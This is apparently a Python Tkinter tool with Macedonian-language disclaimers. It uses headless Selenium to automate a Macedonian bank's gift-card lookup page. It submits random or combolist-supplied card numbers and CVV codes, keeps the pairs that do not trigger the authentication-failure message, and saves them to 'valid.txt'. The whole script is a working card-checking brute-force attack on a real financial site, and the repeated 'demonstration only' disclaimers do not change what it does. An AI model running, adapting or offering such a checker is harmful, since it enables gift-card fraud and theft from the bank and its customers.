#ВНИМАНИЕ: Оваа скрипта е исклучиво за демонстрационни цели и не треба да се користи за нарушување на законите или за наштета на банката или било кој друг. Било каква нелегална употреба на оваа скрипта може да има сериозни правни последици. Користењето на оваа скрипта за нелегални активности е строго забрането.
#Авторот на оваа скрипта не презема одговорност за нелегална употреба или било какви негативни последици што можат да произлезат од користењето на оваа скрипта. Ве молиме да ја користите само за легални цели и во согласност со законите и етиката.
#Ве молиме да разберете дека оваа скрипта не е наменета за било какви нелегални активности и не би требало да се користи за такви цели. Вашиот користење на оваа скрипта подразбира дека се согласувате со ова внимание и го користите исклучиво за легални цели.
#### Warning: This project is not intended for any cyber disruption or illegal purposes. The author is not responsible for any misuse of this code.
#Автор на оваа скрипта е: Леонид Крстевски

import time
import random
import webbrowser
import tkinter as tk
from tkinter import messagebox
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

def generate_card_number():
    return ''.join(random.choices('0123456789', k=16))

def generate_cvv():
    return ''.join(random.choices('0123456789', k=8))

def read_card_cvv_pairs():
    card_cvv_pairs = []
    try:
        with open("combolist.txt", "r") as f:
            lines = f.readlines()
            for line in lines:
                pair = line.strip()
                card, cvv = pair.split(":")
                card_cvv_pairs.append((card, cvv))
    except FileNotFoundError:
        messagebox.showerror("Неуспешно", "Фајлот 'combolist.txt' не е пронајден.")
    return card_cvv_pairs

def save_to_file(card_numbers):
    with open("valid.txt", "a") as f:
        for card in card_numbers:
            f.write(card + "\n")

def handle_option_change(*args):
    choice = combo_choice.get()
    if choice == 'Да':
        combo_count_entry.config(state='disabled')
    else:
        combo_count_entry.config(state='normal')

def check_combinations():
    url = "https://www.banka.com.mk/GiftCards/Gift.aspx"
    options = webdriver.FirefoxOptions()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options=options)
    try:
        choice = combo_choice.get()
        if choice == 'Да':
            card_cvv_pairs = read_card_cvv_pairs()
        else:
            num_pairs = int(combo_count.get())
            if num_pairs > 100:
                messagebox.showerror("Неуспешно", "Бројот на комбинации мора да е од 1 до 100.")
                return
            card_cvv_pairs = [(generate_card_number(), generate_cvv()) for _ in range(num_pairs)]

        valid_card_numbers = []
        for i, (card, cvv) in enumerate(card_cvv_pairs, start=1):
            time.sleep(0.5)
            driver.get(url)
            card_number_input = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "txtKarticka"))
            )
            cvv2_input = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "txtCVV2"))
            )
            card_number_input.clear()
            card_number_input.send_keys(card)
            cvv2_input.clear()
            cvv2_input.send_keys(cvv)
            submit_button = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.ID, "btnPrikazi"))
            )
            submit_button.click()
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "divPrikazKarticka"))
            )
            invalid_message = "Неуспешна автентификација !"
            if invalid_message not in driver.page_source:
                valid_card_numbers.append(card)
            # Display combination in text box
            combo_textbox.insert(tk.END, f"Комбинација {i}: {card} - {cvv}\n")
            combo_textbox.see(tk.END)  # Scroll to the end of the text box
            root.update()  # Update the GUI to show the new text

        if choice != 'Да':
            if valid_card_numbers:
                save_to_file(valid_card_numbers)
            else:
                messagebox.showinfo("Инфо", "Нема валидни комбинации")
    except Exception as e:
        messagebox.showerror("Error", "An error occurred: " + str(e))
    finally:
        driver.quit()

# Open website when the script starts
webbrowser.open("https://github.com/13069/")

root = tk.Tk()
root.title("banka.com.mk Проверка на Гифт Картички")
root.configure(bg="white")  # Set background color to white

frame1 = tk.Frame(root, bg="white")
frame1.pack(pady=10)

label_choice = tk.Label(frame1, text="Дали имате фајл со ваши комбинации?", bg="white")
label_choice.grid(row=0, column=0, padx=10, pady=5)

combo_choice = tk.StringVar()
combo_choice.set("Не")  # Set default selection to "No"
combo = tk.OptionMenu(frame1, combo_choice, "Да", "Не", command=handle_option_change)
combo.config(bg="green", fg="white")  # Set combo box color to green with white text
combo.grid(row=0, column=1, padx=10, pady=5)

frame2 = tk.Frame(root, bg="white")
frame2.pack(pady=10)

label_count = tk.Label(frame2, text="Внесете број на комбинации за генерирање (1-100):", bg="white")
label_count.grid(row=0, column=0, padx=10, pady=5)

combo_count = tk.StringVar()
combo_count_entry = tk.Entry(frame2, textvariable=combo_count)
combo_count_entry.grid(row=0, column=1, padx=10, pady=5)

button_check = tk.Button(root, text="Провери Комбинации", command=check_combinations, bg="green", fg="white")
button_check.pack(pady=10)

combo_textbox_frame = tk.Frame(root, bg="white")
combo_textbox_frame.pack(pady=10)

combo_textbox_label = tk.Label(combo_textbox_frame, text="Комбинации:", bg="white")
combo_textbox_label.pack()

combo_textbox = tk.Text(combo_textbox_frame, width=50, height=10)
combo_textbox.pack()

author_label = tk.Label(root, text="Автор: Леонид Крстевски", bg="white", fg="green")
author_label.pack(pady=5)

root.mainloop()


#ВНИМАНИЕ: Оваа скрипта е исклучиво за демонстрационни цели и не треба да се користи за нарушување на законите или за наштета на банката или било кој друг. Било каква нелегална употреба на оваа скрипта може да има сериозни правни последици. Користењето на оваа скрипта за нелегални активности е строго забрането.
#Авторот на оваа скрипта не презема одговорност за нелегална употреба или било какви негативни последици што можат да произлезат од користењето на оваа скрипта. Ве молиме да ја користите само за легални цели и во согласност со законите и етиката.
#Ве молиме да разберете дека оваа скрипта не е наменета за било какви нелегални активности и не би требало да се користи за такви цели. Вашиот користење на оваа скрипта подразбира дека се согласувате со ова внимание и го користите исклучиво за легални цели.
#### Warning: This project is not intended for any cyber disruption or illegal purposes. The author is not responsible for any misuse of this code.
#Автор на оваа скрипта е: Леонид Крстевски
